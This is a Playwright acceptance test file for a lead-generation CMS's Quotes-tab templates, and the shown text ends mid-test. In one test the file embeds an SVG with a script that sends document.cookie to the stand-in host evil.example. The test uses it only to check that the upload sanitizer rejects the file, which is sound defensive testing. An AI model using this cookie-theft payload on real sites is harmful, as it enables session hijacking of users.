// LeadGen Round-4 Remediation — Phase P7 close: THE ROUND-4 OPERATOR ACCEPTANCE
// SUITE, Quotes-tab Templates/frame-elements half (register docs/leadgen/
// round4/register.md rows R4-15..R4-23, R4-26 + bonus R4-36/40). Re-walks the
// operator's ACTUAL Quotes-tab items (LEADGEN-ROUND4-INVESTIGATION-2026-07-19
// .md item 10 A/B/C/D/E/F/G/H + the H-adjacent disclosure gap + the restructure
// IA) as live operator journeys against the CURRENT code (P5 already merged).
// SIBLING FILES: leadgen-round4-acceptance.gesture.spec.ts (Section Studio,
// items 1-9) and leadgen-round4-funnel-acceptance.gesture.spec.ts (theme v2 /
// structure / pages / routing / A-B, item 10I/10J + funnel deltas + D-2) — the
// Quotes-tab surface was split across these 2 files (this one + the funnel one)
// because a single combined file's per-test frame-seeding volume risked the
// documented socket-exhaustion flake on long combined runs; each file is
// independently runnable per-file exactly like the phase gates it extends.
//
// Patterns cribbed verbatim (nothing reinvented): __p5b-quotes-ia.spec.ts (the
// Templates+Themes top-tab clicks, all seven+one box-picker authoring
// sequences: CTA/disclosure/free-text/brand-logos/footer/images, the progress-
// editor layout probe, the Activity/Verticals New-Quote form, the site-logo
// preview + no-logo hint), __p5a-frame.spec.ts (the live frame-element render
// assertions + the progress-style-distinctness signature method), __p5c-assets
// .spec.ts (the sanitized SVG upload + the zero-cost persona-endpoint guards —
// a real billable OpenAI call is NEVER triggered in this file, matching that
// spec's own documented safety convention).
//
// ENGINE NOTE: same disclosed chromium-only registration gap as the sibling
// Section-Studio file (playwright.config.ts's CROSS_ENGINE_GESTURE_SPECS is an
// explicit whitelist outside this slice's ownership) — see that file's header
// for the full explanation. This is a pure admin-UI + live-funnel spec (no
// drag), so registering it costs nothing if the conductor wants the 2nd engine.
//
// Run (per-file, fresh D1, worktree-isolated):
//   pgrep -f kodigital-cms-round4-wt | xargs -r kill -9; cd api && npm run db:reset:local
//   PW_PORT=8899 npx playwright test test-ui/leadgen-round4-quotes-acceptance.gesture.spec.ts \
//     --project=chromium --workers=1 --reporter=line

import { test, expect, request as playwrightRequest, type APIRequestContext, type FrameLocator, type Page } from "@playwright/test";
import { seedActiveSite, uploadPng } from "./listicles-p6-seed";
import { PW_PORT } from "./utils/base-url";

test.use({ launchOptions: { args: ["--host-resolver-rules=MAP *.e2e.test 127.0.0.1"] }, viewport: { width: 1280, height: 900 } });

const ORIGIN = `http://127.0.0.1:${PW_PORT}`;
const LG_API = "/api/admin/leadgen";

async function json<T>(
  res: { ok(): boolean; status(): number; json(): Promise<unknown>; text(): Promise<string> },
  label: string,
): Promise<T> {
  if (!res.ok()) throw new Error(`${label} HTTP ${res.status()}: ${await res.text()}`);
  return (await res.json()) as T;
}

const CONTINUE = { type: "ContinueButton", question_id: "cont", props: { label: "Continue" } };
// activity MUST match the owning quote's own activity (putVariantHandler's
// pages/slots validation rejects a section whose activity differs from the
// quote's) — never a hardcoded literal.
function yesNoSection(name: string, field: string, activity: string): Record<string, unknown> {
  return {
    activity,
    vertical: "life",
    status: "active",
    section_name: name,
    headline_text: name,
    content_json: JSON.stringify({
      components: [
        { type: "TwoButtonYesNo", question_id: `q_${field}`, question_key: field, internal_field: field, answer_type: "boolean", required: true },
        CONTINUE,
      ],
    }),
  };
}

interface SeededQuote {
  quotePublicId: string;
  funnelPublicId: string;
  variantPublicId: string;
  activity: string;
  host: string;
  slug: string;
}

// A quote+funnel+variant+section+activation, through the REAL admin API —
// the SAME shape __p5a/__p5b/__p5c all use. Disjoint namespace "r4q-"/"R4Q ".
async function seedQuote(request: APIRequestContext, tag: string): Promise<SeededQuote> {
  const u = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const safe = `r4q-${tag}-${u}`.replace(/[^a-z0-9-]/gi, "");
  const activity = `r4q_${tag}_${u}`;
  const host = `${safe}.e2e.test`;
  const siteId = await seedActiveSite(request, host, `R4Q ${tag} ${u}`);
  const quote = await json<{ public_id: string; funnels: Array<{ public_id: string; variants: Array<{ public_id: string }> }> }>(
    await request.post(`${LG_API}/quotes`, { data: { quote_name: `R4Q ${tag} ${u}`, activity, verticals: ["life"] } }),
    "quote create",
  );
  const funnelPublicId = quote.funnels[0]!.public_id;
  const variantPublicId = quote.funnels[0]!.variants[0]!.public_id;
  const section = await json<{ public_id: string }>(
    await request.post(`${LG_API}/sections`, { data: yesNoSection(`${safe}-s1`, `f_${u}`, activity) }),
    "section create",
  );
  await json(
    await request.put(`${LG_API}/variants/${variantPublicId}`, {
      data: { pages: [{ name: "Page 1", slots: [{ kind: "fixed", section_id: section.public_id }] }] },
    }),
    "variant pages",
  );
  // LeadGen Rework §4.3-1/§4.3-15 (P1, own-hand-verified): activation now
  // preflights "the shared first page needs at least one section" — this
  // pre-M2 helper predates that requirement. Seed a TRIVIAL pass-through
  // shared page (a single ContinueButton, no questions) — the SAME
  // established pattern leadgen-round4-acceptance.gesture.spec.ts /
  // leadgen-rework-p2-studio.gesture.spec.ts / __p2c-studio.spec.ts already
  // use (verified by direct read of leadgen-round4-acceptance.gesture.spec.ts
  // lines ~212-227).
  const sharedSection = await json<{ public_id: string }>(
    await request.post(`${LG_API}/sections`, {
      data: {
        section_name: `${safe}-shared`,
        activity,
        vertical: "life",
        status: "active",
        headline_text: `${safe}-shared`,
        content_json: JSON.stringify({ components: [CONTINUE] }),
      },
    }),
    "shared section create",
  );
  await json(
    await request.post(`${LG_API}/quotes/${quote.public_id}/shared-page`, {
      data: { sections: [{ section_id: sharedSection.public_id }] },
    }),
    "shared page create",
  );
  await json(
    await request.put(`${LG_API}/quotes/${quote.public_id}/activation/${siteId}`, { data: { enabled: true, slug: safe } }),
    "activation",
  );
  return { quotePublicId: quote.public_id, funnelPublicId, variantPublicId, activity, host, slug: safe };
}

async function putFrame(request: APIRequestContext, funnelPublicId: string, frameConfigJson: Record<string, unknown>): Promise<void> {
  await json(
    await request.put(`${LG_API}/funnels/${funnelPublicId}/frame`, { data: { frame_config_json: frameConfigJson } }),
    "frame put",
  );
}

function canvas(page: Page): FrameLocator {
  return page.frameLocator("#lg-preview-iframe");
}
async function openEditor(page: Page, quotePublicId: string): Promise<void> {
  await page.goto(`/admin/leadgen/quotes/${quotePublicId}/edit`, { waitUntil: "domcontentloaded" });
  await expect(canvas(page).locator("[data-frame-region='section_slot']")).toBeVisible({ timeout: 20_000 });
}
const shellUrl = (s: { host: string; slug: string }) => `http://${s.host}:${PW_PORT}/lg/${s.slug}`;
async function ready(page: Page): Promise<void> {
  await expect(page.locator('#lg-funnel-root[data-lg-ready="1"]')).toHaveCount(1, { timeout: 10_000 });
}

// Click the trivial shared-page's Continue button once (seedQuote's own
// doc comment) so a live leg lands on the funnel content under test — the
// SAME pattern leadgen-round4-acceptance.gesture.spec.ts's own
// passSharedPage already uses (verified by direct read).
async function passSharedPage(page: Page): Promise<void> {
  const cont = page.locator("[data-lg-continue]").first();
  await expect(cont, "the shared page's Continue is reachable").toBeVisible({ timeout: 8_000 });
  await cont.click();
}

// The dynamic-host live leg (shellUrl -> a *.e2e.test tenant host, resolved
// via chromium's --host-resolver-rules launch arg) is chromium-only — firefox
// has no equivalent for a wildcard/dynamic subdomain (network.dns.localDomains
// cannot resolve one). On firefox: record a DOCUMENTED skip annotation
// (visible in the reporter) and signal the caller to return after its
// both-engine admin/authoring assertions — the SAME liveLegChromiumOnly()
// pattern leadgen-operator-acceptance.gesture.spec.ts / leadgen-round4-
// acceptance.gesture.spec.ts already use.
function liveLegChromiumOnly(browserName: string, reason: string): boolean {
  if (browserName === "firefox") {
    test.info().annotations.push({ type: "live-leg-skip", description: reason });
    return false;
  }
  return true;
}

let apiCtx: APIRequestContext;
test.beforeAll(async () => {
  apiCtx = await playwrightRequest.newContext({ baseURL: ORIGIN });
});
test.afterAll(async () => {
  await apiCtx.dispose();
});

test.describe("Round-4 acceptance — Quotes tab: Templates/frame elements (register R4-15..R4-23, R4-26, bonus R4-36/40)", () => {
  // =========================================================================
  // Item 10A — activity/verticals dropdowns fed by real endpoints on New Quote
  // Deeper gate: __p5b-quotes-ia.spec.ts. Journey: create a quote from the New
  // Quote FORM (not the raw API) using a real select fed by a seeded activity,
  // plus the "add new" escape hatches for both activity and verticals.
  // =========================================================================
  test("Item 10A — New Quote: Activity is a select fed by real seeded activities (+ add-new); Verticals is a multi-select (+ add-new)", async ({ page }) => {
    const seed = await seedQuote(apiCtx, "act");
    await page.goto("/admin/leadgen/quotes/new", { waitUntil: "domcontentloaded" });

    const activitySel = page.locator("#lg-q-activity");
    await expect(activitySel, "Activity is a real select").toBeVisible();
    await expect(page.locator("#lg-q-verticals"), "Verticals is a real multi-select").toBeVisible();
    await expect(activitySel.locator(`option[value="${seed.activity}"]`), "the seeded activity rides the option list").toHaveCount(1);

    const u = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    await page.locator("#lg-q-name").fill(`R4Q new quote ${u}`);
    await activitySel.selectOption("__new__");
    const activityNew = page.locator("#lg-q-activity-new");
    await expect(activityNew, "the add-new escape hatch appears").toBeVisible();
    const newActivity = `r4q_new_activity_${u}`;
    await activityNew.fill(newActivity);
    await page.locator("#lg-q-verticals-new").fill("r4qvertical");
    await page.locator("#lg-q-verticals-add").click();
    await expect(page.locator('#lg-q-verticals option[value="r4qvertical"]')).toHaveJSProperty("selected", true);

    await page.locator("#lg-quote-new-save").click();
    await page.waitForURL(/\/admin\/leadgen\/quotes\/[^/]+\/edit/);
    const createdPublicId = page.url().match(/\/quotes\/([^/]+)\/edit/)?.[1];
    expect(createdPublicId, `created quote id from ${page.url()}`).toBeTruthy();
    const structure = await json<{ quote: { activity: string; verticals_json: string[] } }>(
      await page.request.get(`${LG_API}/quotes/${createdPublicId}/structure`),
      "structure re-fetch",
    );
    expect(structure.quote.activity).toBe(newActivity);
    expect(structure.quote.verticals_json).toEqual(["r4qvertical"]);
  });

  // =========================================================================
  // Item 10B — real site-logo preview + no-logo fallback (Image11 "cc").
  // Deeper gate: __p5b-quotes-ia.spec.ts. Journey: selecting a preview site
  // WITH a logo resolves the REAL logo image; a logo-less site shows the
  // explicit A-8 fallback chip (never a bare unexplained fallback mark).
  // Rework §8.8 (P4 S4.2): REPAIRED — the admin-only `[data-admin-preview-
  // hint="1"]` marker this used to check is retired (superseded by the
  // ALWAYS-rendered chip, live+preview — see frame.ts renderLogoFallbackChip
  // doc comment); the chip's OWN class now proves the SAME "explicit, never
  // bare" guarantee, more strongly.
  // =========================================================================
  test("Item 10B — the builder preview resolves the REAL selected site's logo; a logo-less site shows the explicit A-8 fallback chip", async ({ page }) => {
    const seed = await seedQuote(apiCtx, "logo");
    const u = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const logoSiteId = await seedActiveSite(apiCtx, `r4q-logosite-${u}.e2e.test`, `R4Q Logo Site ${u}`);
    const logo = await uploadPng(apiCtx, `r4q-logo-${u}.png`);
    await json(
      await apiCtx.patch("/api/admin/settings", {
        data: { site_id: logoSiteId, updates: { site_name: `R4Q Logo Site ${u}`, logo_media_id: logo.storage_key } },
      }),
      "site branding",
    );
    const bareSite = await json<{ resource: { id: string } }>(
      await apiCtx.post("/api/admin/sites", { data: { domain: `r4q-baresite-${u}.e2e.test`, name: `R4Q Bare Site ${u}`, vertical_slug: "finance", activity: "main" } }),
      "bare site create",
    );

    await openEditor(page, seed.quotePublicId);
    await page.locator("#lg-site-select").selectOption(logoSiteId);
    const logoImg = canvas(page).locator("[data-frame-region='logo'] img.lg-logo-img");
    await expect(logoImg, "the REAL uploaded logo resolves").toBeVisible({ timeout: 20_000 });
    await expect(logoImg).toHaveAttribute("src", new RegExp(logo.storage_key.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));

    await page.locator("#lg-site-select").selectOption(bareSite.resource.id);
    const chip = canvas(page).locator(".lg-frame-logo-fallback");
    await expect(chip, "a logo-less site shows the explicit A-8 fallback chip, never a bare unexplained mark").toBeVisible({ timeout: 20_000 });
  });

  // =========================================================================
  // Item 10C — phone/CTA element: a slot in each placement, alignment, tel:,
  // conditional display (+ bonus B-4.3 phone-only silent no-render, inverted).
  // Deeper gate: __p5a-frame.spec.ts + __p5b-quotes-ia.spec.ts. Journey: author
  // a CTA slot with ONLY a phone number (no label) through the REAL Templates
  // box picker -> save -> live it renders a tel: link (never nothing); author
  // a SECOND, conditionally-displayed slot -> live it is hidden+hooked.
  // =========================================================================
  test('Item 10C — phone/CTA: a phone-only slot renders (B-4.3 silent no-render inverted); a __state-conditioned slot is hidden+hooked live', async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "cta");
    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();
    await page.locator('[data-tplbox-pick="cta"]').click();
    const ctaPanel = page.locator('[data-tplbox-panel="cta"]');

    // Row 1: phone ONLY, no label — the operator's B-4.3 bug, inverted.
    await ctaPanel.locator('[data-tplbox-add="cta_slots"]').click();
    const row1 = ctaPanel.locator("[data-cta-row]").nth(0);
    await row1.locator("[data-cta-slot]").selectOption("header_right");
    await row1.locator("[data-cta-tel]").fill("+1 555 111 2222");
    await row1.locator("[data-cta-tel]").blur();

    // Row 2: a __state-conditioned slot (footer).
    await ctaPanel.locator('[data-tplbox-add="cta_slots"]').click();
    const row2 = ctaPanel.locator("[data-cta-row]").nth(1);
    await row2.locator("[data-cta-slot]").selectOption("footer");
    await row2.locator("[data-cta-label]").fill("Call a CA agent");
    await row2.locator("[data-cta-label]").blur();
    await row2.locator("[data-cta-tel]").fill("+1 555 333 4444");
    await row2.locator("[data-cta-tel]").blur();
    await row2.locator("[data-cta-cond-toggle]").click();
    const condRow = row2.locator("[data-cta-cond-row]").first();
    await condRow.locator("[data-cta-cond-field]").selectOption("__state");
    await condRow.locator("[data-cta-cond-op]").selectOption("eq");
    await condRow.locator("[data-cta-cond-value]").fill("CA");
    await condRow.locator("[data-cta-cond-value]").blur();

    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);
    await expect(page.locator("#lg-quote-ok")).toBeVisible({ timeout: 20_000 });

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10C live CTA render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The Templates box-picker authoring + save assertions above run engine-agnostically.",
      )
    )
      return;

    await page.goto(shellUrl(seed), { waitUntil: "load" });
    await ready(page);
    // Phone-only slot renders a tel: link — never silently nothing.
    await expect(page.locator('a[href="tel:+1 555 111 2222"]'), "a phone-only CTA (no label) renders a real tel: link").toBeVisible();
    // Conditioned slot is server-rendered hidden, carrying the evaluator hook.
    const cond = page.locator(".lg-frame-cta--footer");
    await expect(cond).toBeAttached();
    await expect(cond).toBeHidden();
  });

  // =========================================================================
  // Item 10D — 5+ distinct progress styles (numbered != bar, B-4.7 inverted).
  // Deeper gate: __p5a-frame.spec.ts + __p5b-quotes-ia.spec.ts (editor layout).
  // Journey: author "numbered" through the REAL style picker -> save -> live
  // it renders distinctly from "bar" (direct-API-seeded sibling funnels prove
  // ALL 6 styles are pairwise-unique, the exact P5a distinctness method).
  // =========================================================================
  test('Item 10D — progress style picker is a real aligned control; "numbered" is authored + renders DISTINCT from "bar" live; all 6 styles pairwise-unique', async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "prog");
    await openEditor(page, seed.quotePublicId);
    await canvas(page).locator("[data-frame-region='progress']").first().click();
    const panel = page.locator('[data-region-panel="progress"]');
    await expect(panel).toBeVisible();
    const rows = panel.locator(".lg-progress-style-opt");
    await expect(rows, "all 6 progress styles are offered (hidden/bar/dots/numbered/percent/icon_on_track)").toHaveCount(6);
    // Editor layout fix (Image15): the radio sits RIGHT of its label on every row.
    for (let i = 0; i < 6; i++) {
      const labelBox = await rows.nth(i).locator(".lg-progress-style-label").boundingBox();
      const radioBox = await rows.nth(i).locator('input[type="radio"]').boundingBox();
      expect(radioBox!.x, `row ${i}: radio x > label x`).toBeGreaterThan(labelBox!.x);
    }
    await rows.filter({ has: page.locator('input[value="numbered"]') }).locator('input[type="radio"]').check();
    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10D live pairwise-distinctness needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The style-picker authoring + alignment assertions above run engine-agnostically.",
      )
    )
      return;

    // Pairwise-distinctness across the 5 RENDERING styles (the exact
    // __p5a-frame.spec.ts method/set) — "hidden" is deliberately EXCLUDED:
    // frame.ts renderProgressRegion returns "" for style==="hidden" (own-hand
    // confirmed), i.e. the WHOLE [data-frame-region="progress"] wrapper is
    // omitted from the DOM by design — there is no node to take a DOM
    // signature of, so it cannot be compared the same way as the 5 real
    // renders (its own picker-count/option-presence is already covered above).
    // Reuse the SAME seeded funnel for every style (repeated frame PUTs, no
    // new site/quote per style) to keep this test's socket footprint low
    // (per-file OPS note: a socket-exhaustion flake truncates runs that open
    // too many site+quote seeds in one test).
    const STYLES = ["bar", "dots", "numbered", "percent", "icon_on_track"] as const;
    const sigOf = async (style: string): Promise<string> => {
      // ALWAYS (re-)apply the CURRENT style — the loop reuses ONE funnel
      // sequentially, so skipping this for "numbered" (assuming the earlier
      // UI-authored value "still" holds) actually reads whatever the
      // PREVIOUS iteration's putFrame left behind instead.
      await putFrame(apiCtx, seed.funnelPublicId, { version: 1, template: "centered", progress: { style, show_label: true } });
      // Reusing ONE funnel's URL across styles means a bare page.goto to the
      // SAME url can be satisfied from cache — cache-bust so each style's
      // just-PUT frame config is genuinely re-fetched, not the prior style's.
      await page.goto(`${shellUrl(seed)}?_cb=${Date.now()}_${style}`, { waitUntil: "load" });
      await ready(page);
      const region = page.locator('[data-frame-region="progress"]').first();
      return region.evaluate((el) => {
        const has = (sel: string) => el.querySelector(sel) !== null;
        const fill = el.querySelector(".lg-progress-fill");
        const thumb = fill ? getComputedStyle(fill as Element, "::after").content : "none";
        const label = el.querySelector(".lg-progress-text");
        const labelPos = label ? getComputedStyle(label as Element).position : "none";
        const mode = el.querySelector("[data-lg-progress]")?.getAttribute("data-mode") ?? "none";
        return JSON.stringify({ track: has(".lg-progress-track"), numbered: has(".lg-steps--numbered"), dots: has(".lg-steps") && !has(".lg-steps--numbered"), thumb: thumb !== "none" && thumb !== "normal", labelPos, mode });
      });
    };
    const sigs: Record<string, string> = {};
    for (const style of STYLES) sigs[style] = await sigOf(style);
    const unique = new Set(Object.values(sigs));
    expect(unique.size, `signatures: ${JSON.stringify(sigs, null, 2)}`).toBe(STYLES.length);
    expect(sigs.numbered, "the authored 'numbered' style must render DISTINCT from 'bar' (B-4.7)").not.toBe(sigs.bar);
  });

  // =========================================================================
  // Item 10E — free text above/below with page targeting. Deeper gate:
  // __p5a-frame.spec.ts + __p5b-quotes-ia.spec.ts. Journey: author an
  // above-section, page-1-only block through the REAL box picker -> save ->
  // reload round-trips -> LIVE the block shows on page 1 and hides on page 2.
  // =========================================================================
  test("Item 10E — free text above the section, page-1-targeted, authored via the real picker -> round-trips -> hides on page 2 live", async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "ft");
    // Overwrite seedQuote's own single-page variant with a real 2-page one
    // (2 fresh sections) so the page-targeting leg has somewhere to hide on.
    const u = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const page1Section = await json<{ public_id: string }>(
      await apiCtx.post(`${LG_API}/sections`, { data: yesNoSection(`ft-page1-${u}`, `ft1_${u}`, seed.activity) }),
      "page1 section create",
    );
    const page2Section = await json<{ public_id: string }>(
      await apiCtx.post(`${LG_API}/sections`, { data: yesNoSection(`ft-page2-${u}`, `ft2_${u}`, seed.activity) }),
      "page2 section create",
    );
    await json(
      await apiCtx.put(`${LG_API}/variants/${seed.variantPublicId}`, {
        data: {
          pages: [
            { name: "Page 1", slots: [{ kind: "fixed", section_id: page1Section.public_id }] },
            { name: "Page 2", slots: [{ kind: "fixed", section_id: page2Section.public_id }] },
          ],
        },
      }),
      "variant pages (2-page)",
    );
    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();
    await page.locator('[data-tplbox-pick="free_text"]').click();
    const ftPanel = page.locator('[data-tplbox-panel="free_text"]');
    await ftPanel.locator('[data-tplbox-add="free_text"]').click();
    const ftRow = ftPanel.locator("[data-ft-entry-row]").first();
    await ftRow.locator("[data-ft-slot]").selectOption("above_section");
    await ftRow.locator("[data-pt-mode]").selectOption("first");
    const blockRow = ftRow.locator("[data-ft-block-row]").first();
    await blockRow.locator("[data-ft-block-text]").fill("Rates shown are illustrative.");
    await blockRow.locator("[data-ft-block-text]").blur();

    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);
    await expect(page.locator("#lg-quote-ok")).toBeVisible({ timeout: 20_000 });

    const frameBody = await json<{ frame_config: { free_text?: Array<{ slot: string; pages?: { mode: string } }> } }>(
      await apiCtx.get(`${LG_API}/funnels/${seed.funnelPublicId}/frame`),
      "frame re-fetch",
    );
    expect(frameBody.frame_config.free_text?.[0]?.slot).toBe("above_section");
    expect(frameBody.frame_config.free_text?.[0]?.pages?.mode).toBe("first");

    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();
    await page.locator('[data-tplbox-pick="free_text"]').click();
    const row2 = page.locator('[data-tplbox-panel="free_text"] [data-ft-entry-row]').first();
    await expect(row2.locator("[data-ft-slot]"), "round-trips on reload").toHaveValue("above_section");

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10E live page-targeting needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The free-text box-picker authoring + reload round-trip assertions above run engine-agnostically.",
      )
    )
      return;

    await page.goto(shellUrl(seed), { waitUntil: "load" });
    await ready(page);
    // "mode: first" gates on data-show-on="first", which rides the engine's
    // OWN step<=1 toggle (frame.ts pageTargetGating's doc comment) — an
    // OVERALL-VISIT step count, not a funnel-only one. seedQuote's own
    // trivial pass-through shared page (Continue-only, added for the
    // §4.3-15 activation preflight — see seedQuote's doc comment) is now
    // step 1, so THIS is where "renders on page 1" is checked — before
    // passing it, not after.
    const ftBlock = page.locator("text=Rates shown are illustrative.");
    await expect(ftBlock, "renders on page 1 / step 1 (mode: first)").toBeVisible();

    // Advance to step 2 — passing the shared page's own Continue is now
    // what moves step 1 -> 2 (the funnel's OWN page 1, a 2-choice-page
    // funnel by this test's own 2-page variant-pages PUT above) — the
    // page-1-only block must hide (the SAME [data-show-on] engine toggle
    // __p5a-frame.spec.ts already proves for free text).
    await passSharedPage(page);
    await expect(page.locator("[data-lg-progress]").first(), "advanced to step 2").toHaveAttribute("data-lg-progress-current", "2");
    await expect(ftBlock, "the page-1/step-1-only block hides by step 2").toBeHidden();
  });

  // =========================================================================
  // Item 10F — brand-logo strips + sanitized SVG upload. Deeper gate:
  // __p5a-frame.spec.ts + __p5c-assets.spec.ts. Journey: upload a VALID SVG
  // through the sanitized endpoint -> it renders as a real <img> live; a
  // MALICIOUS SVG (<script>) is rejected 400 with a plain-language message and
  // is never stored (the SVG-XSS security commitment).
  // =========================================================================
  test("Item 10F — brand logos: a valid SVG uploads sanitized + renders live; a malicious SVG is rejected and never stored", async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "logos");
    const VALID_SVG = `<?xml version="1.0"?><!-- brand --><svg viewBox="0 0 48 24"><rect width="48" height="24" fill="#1a56db"/><text x="4" y="16" font-size="10" fill="#fff">ACME</text></svg>`;
    const MALICIOUS_SVG = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.example/'+document.cookie)</script></svg>`;

    const up = await json<{ ok: boolean; storage_key: string; url: string; sanitized: boolean }>(
      await apiCtx.post(`${LG_API}/assets/brand-logo`, {
        multipart: { file: { name: "acme.svg", mimeType: "image/svg+xml", buffer: Buffer.from(VALID_SVG) }, site_id: "r4q-logos" },
      }),
      "valid svg upload",
    );
    expect(up.ok).toBe(true);
    expect(up.sanitized).toBe(true);
    const served = await apiCtx.get(up.url);
    expect(served.status()).toBe(200);
    const body = await served.text();
    expect(body, "author comment stripped").not.toContain("<!--");
    expect(body, "xml PI stripped").not.toContain("<?xml");

    const malicious = await apiCtx.post(`${LG_API}/assets/brand-logo`, {
      multipart: { file: { name: "evil.svg", mimeType: "image/svg+xml", buffer: Buffer.from(MALICIOUS_SVG) }, site_id: "r4q-logos-evil" },
    });
    expect(malicious.status(), "a malicious SVG is rejected, never stored").toBe(400);
    const malBody = (await malicious.json()) as { error: string; code: string };
    expect(malBody.code).toBe("svg_rejected");
    expect(malBody.error, "plain-language rejection").toMatch(/disallowed element: script/i);

    // Author via the REAL box picker so the operator's actual path is proven,
    // then verify the sanitized upload renders as a plain <img> live.
    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();
    await page.locator('[data-tplbox-pick="brand_logos"]').click();
    const blPanel = page.locator('[data-tplbox-panel="brand_logos"]');
    await blPanel.locator("[data-bl-enabled]").check();
    await blPanel.locator('[data-tplbox-add="brand_logos.items"]').click();
    const blRow = blPanel.locator("[data-bl-item-row]").first();
    await blRow.locator("[data-bl-item-url]").fill(up.url);
    await blRow.locator("[data-bl-item-url]").blur();
    await blRow.locator("[data-bl-item-alt]").fill("ACME");
    await blRow.locator("[data-bl-item-alt]").blur();
    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10F live sanitized-image render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The SVG upload/rejection assertions (pure API) + the brand-logos box-picker authoring above run engine-agnostically.",
      )
    )
      return;

    await page.goto(shellUrl(seed), { waitUntil: "load" });
    await ready(page);
    const img = page.locator(".lg-frame-brand-logos img.lg-logo-strip-img");
    await expect(img).toHaveCount(1);
    const loaded = await img.evaluate((el) => (el as HTMLImageElement).complete && (el as HTMLImageElement).naturalWidth > 0);
    expect(loaded, "the sanitized SVG loaded as a real image").toBe(true);
  });

  // =========================================================================
  // Item 10G — rich elements (trust/benefit icon+text + hover tooltip) + an AI
  // persona-image element. Deeper gates: __p5a-frame.spec.ts + __p5c-assets
  // .spec.ts + __p5b-quotes-ia.spec.ts (H · Images). SAFETY: a real billable
  // OpenAI call is NEVER triggered here (matches __p5c/__p5b's own convention)
  // — the persona endpoint's ZERO-COST guards are proven, and "a generated url
  // renders" is proven via the SAME images element with a manually-set URL.
  // =========================================================================
  test("Item 10G — trust row icon+text with hover tooltip renders live; the persona picker's zero-cost guards block BOTH misuses (no billable call); an image element renders + hides by page", async ({ page, browserName }) => {
    const seed = await seedQuote(apiCtx, "trust");
    await putFrame(apiCtx, seed.funnelPublicId, {
      version: 1,
      template: "centered",
      // frames.ts: trust_rows is a TOP-LEVEL ARRAY of FrameTrustRowConfig
      // groups (each carrying its OWN items[]) — not a bare {items} object.
      trust_rows: [{ items: [{ icon: "shield-check", text: "Licensed in all 50 states", tooltip: "NAIC verified" }, { icon: "star", text: "4.8/5 rated" }] }],
    });

    // Persona picker: zero-cost guards, through the REAL Templates "images"
    // box — engine-agnostic admin-UI authoring, run FIRST (both engines)
    // and BEFORE either live check so a single later live navigation sees
    // both the trust_rows (seeded above) and this authored image together
    // (no second/cache-busted navigation needed).
    await openEditor(page, seed.quotePublicId);
    await page.locator('.lg-qtab[data-tab="templates"]').click();
    await page.locator('[data-tplbox-pick="images"]').click();
    const imgPanel = page.locator('[data-tplbox-panel="images"]');
    await imgPanel.locator('[data-tplbox-add="images"]').click();
    const imgRow = imgPanel.locator("[data-img-item-row]").first();
    await imgRow.locator("[data-img-item-url]").fill("https://example.com/advisor-portrait.png");
    await imgRow.locator("[data-img-item-url]").blur();
    await imgRow.locator("[data-img-item-alt]").fill("Friendly advisor portrait");
    await imgRow.locator("[data-img-item-alt]").blur();
    await imgRow.locator("[data-img-item-slot]").selectOption("below_section");

    const personaSel = imgRow.locator("[data-img-item-persona]");
    let personaImageRequests = 0;
    page.on("request", (r) => {
      if (r.url().includes("/assets/persona-image")) personaImageRequests += 1;
    });
    const generateBtn = imgRow.locator("[data-img-item-generate]");
    await generateBtn.click();
    await expect(imgRow.locator("[data-img-item-gen-error]"), "no persona chosen -> inline error, no network call").toContainText("Choose a persona first.");
    expect(personaImageRequests).toBe(0);
    await personaSel.selectOption("young_woman");
    await generateBtn.click();
    await expect(imgRow.locator("[data-img-item-gen-error]"), "persona chosen but no preview site -> a DIFFERENT error, still zero calls").toContainText("Choose a preview site");
    expect(personaImageRequests, "the billable endpoint is NEVER called by these client-side guards").toBe(0);

    const framePut = page.waitForResponse((r) => r.request().method() === "PUT" && r.url().includes(`/funnels/${seed.funnelPublicId}/frame`));
    await page.locator("#lg-variant-save").click();
    expect((await framePut).status()).toBe(200);

    if (
      !liveLegChromiumOnly(
        browserName,
        "Item 10G live trust-row + placed-image render needs chromium --host-resolver-rules for the dynamic *.e2e.test host. The persona-picker zero-cost-guard admin-UI assertions above run engine-agnostically.",
      )
    )
      return;

    // ONE live navigation (both trust_rows and the authored image are
    // already saved) — first-ever hit to this URL+content-version, so no
    // cache-bust is needed (the Item 10D staleness class only applies to a
    // SECOND hit on the SAME url after an intervening edit).
    await page.goto(shellUrl(seed), { waitUntil: "load" });
    await ready(page);
    const row = page.locator(".lg-frame-trustrow").first();
